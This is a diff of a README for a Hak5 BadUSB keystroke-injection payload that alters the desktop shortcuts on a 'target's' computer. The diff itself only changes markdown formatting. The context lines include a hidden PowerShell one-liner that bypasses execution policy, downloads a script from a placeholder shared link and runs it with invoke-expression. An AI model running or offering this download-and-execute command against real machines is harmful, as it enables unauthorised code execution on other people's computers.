@@ -1,3 +1,5 @@
+---
+---
 ![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 
@@ -73,9 +75,9 @@ Once the script is executed, all of the shortcuts on your target's desktop will 
 
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the dependencies and payload
-```
+<pre><code>
 powershell -w h -NoP -NonI -Exec Bypass $pl = iwr < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
-```
+</code></pre>
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
